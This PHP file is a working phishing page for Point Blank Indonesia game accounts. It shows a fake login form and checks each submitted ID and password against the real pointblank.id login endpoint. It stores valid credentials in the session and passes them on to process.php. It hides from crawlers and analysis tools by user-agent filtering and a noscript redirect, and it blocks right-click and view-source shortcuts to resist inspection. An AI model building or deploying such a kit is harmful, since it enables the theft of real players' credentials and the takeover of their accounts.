<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: https://www.facebook.com/IdhamDotID');
die();
}
if(isset($_POST['login'])) {
    $id = $_POST['userid'];
	$pass = $_POST['password'];
	$trueurl = "https://pointblank.id/login/process";
	$idhaam69fail = "loginFail=0";
	$idhaam69uid= "&userid=".$id;
	$idhaam69upw= "&password=".$pass;
	$data = $idhaam69fail.$idhaam69uid.$idhaam69upw;
	function logintrue($trueurl,$data){
	    $fp = fopen("../../idhaam69.txt", "w");
	    fclose($fp);
	    $idhaamganteng = curl_init();
	    curl_setopt($idhaamganteng, CURLOPT_COOKIEJAR, "idhaam69.txt");
	    curl_setopt($idhaamganteng, CURLOPT_COOKIEFILE, "idhaam69.txt");
	    curl_setopt($idhaamganteng, CURLOPT_TIMEOUT, 40000);
	    curl_setopt($idhaamganteng, CURLOPT_RETURNTRANSFER, TRUE);
	    curl_setopt($idhaamganteng, CURLOPT_URL, $trueurl);
	    curl_setopt($idhaamganteng, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
	    curl_setopt($idhaamganteng, CURLOPT_FOLLOWLOCATION, TRUE);
	    curl_setopt($idhaamganteng, CURLOPT_POST, TRUE);
	    curl_setopt($idhaamganteng, CURLOPT_POSTFIELDS, $data);
	    ob_start();
	    return curl_exec($idhaamganteng);
	    ob_end_clean();
	    curl_close ($idhaamganteng);
	    unset($idhaamganteng);
	}
	$hasiltruenya = logintrue($trueurl,$data);
	if(!$id || !$pass){
	    echo'';
	}else if(preg_match('#tidak sesuai#', $hasiltruenya) || preg_match('#kegagalan login#', $hasiltruenya)) {
	    echo "<script>alert('Data login yang anda masukan tidak sesuai.');</script>";
	}else{
		session_start();
		$_SESSION['status'] = "Login";
		$_SESSION['id'] = $id;
		$_SESSION['pw'] = $pass;
	    echo("<script language=\"javascript\">"); 
        echo("top.location.href = \"process.php\";"); 
        echo("</script>"); 
	}
}
?>
<html>
<head>
	<noscript><meta http-equiv="refresh" content="0; URL=https://www.facebook.com/IdhamDotID"/></noscript>
	<meta charset="utf-8">
	<meta name="author" content="Mirai-Pedia">
    <meta property="og:image" content="./assets/images/og-img.png" />
	<link rel="stylesheet" href="./assets/css/miraipedia.css"/>
	<link rel="shorcut icon" href="./assets/images/favicon.png" />
	<title>PB Indonesia</title>
</head>
<body style="background: #fff;">
	<div class="mirai-login">
		<div class="header-login">
			LOGIN
            
		</div>
    <h2><a href="javascript:windowClose();"></a></h2>
		<div class="mirai-box-login">
			<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="POST">
				<input type="text" name="userid" placeholder="ID" required>.
				<input type="password" name="password" placeholder="PASSWORD" required>
				<button type="submit" name="login">LOGIN</button>
			</form>
		</div>
		<hr class="mirai-garis-login">
		<div class="footer-login">
			FORGOT YOUR <u>PASSWORD?</u>
		</div>
	</div>
</body>
<!--Kode untuk mematikan fungsi klik kanan di blog-->

<script type="text/javascript">

function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn

</script>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->

<script type="text/javascript">

window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}

</script>

<script type="text/javascript">

document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}

</script>